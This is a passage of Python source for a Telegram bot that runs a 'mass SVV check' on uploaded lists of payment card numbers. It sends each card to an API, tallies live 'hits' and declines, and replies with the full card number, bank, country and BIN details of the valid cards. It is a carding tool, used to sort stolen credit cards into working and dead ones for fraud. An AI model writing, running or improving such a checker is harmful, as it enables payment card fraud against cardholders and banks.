                            f"{Status}\n"  # Use the Status variable
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                            f"カ <b>Card:</b> <code>{card}</code>\n"
                            f"<b>Message ➜ {api_response}</b>\n"  # Display the API response
                            f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                            f"<b>Bank:</b> ➜ {bank}\n"
                            f"<b>Country:</b> ➜ {country}\n"
                            f"<b>Bin Info:</b> ➜ {bin_info}\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                            f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                            f"<b>Req by ➜ @{message.from_user.username}</b>\n"
                            f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                        )

                        await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
                    else:
                        declined += 1
            except aiohttp.ClientError:
                pass

            checked_ccs += 1
            left_ccs -= 1

            # Update progress message every 5 seconds
            if time.time() - last_edit_time >= 5:
                await progress_message.edit(
                    f"🛠️ <b>Mass SVV check in progress:</b>\n\n"
                    f"👤 <b>User:</b> @{message.from_user.username}\n"
                    f"🔄 <b>Checked:</b> {checked_ccs}\n"
                    f"✅ <b>Hits:</b> {hits}\n"
                    f"❌ <b>Declined:</b> {declined}\n"
                    f"⏳ <b>Left:</b> {left_ccs}",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True
                )
                last_edit_time = time.time()

    await progress_message.delete()

    result_message = (
        f"🎉 <b>Mass SVV check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
    )

    if hits > 0:
        result_message += f"\n<b>Hit Cards:</b>\n" + "\n".join([f"➜ <code>{card}</code>" for card in hit_cards])

    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    os.remove(file_path)
    
#-------------------------
ver = "alpha2.5.7-10"

print(f"\nBot version 》{ver}\n")

if __name__ == "__main__":
    import threading
    watch_thread = threading.Thread(target=start_watching)
    watch_thread.daemon = True
    watch_thread.start()

    app.run()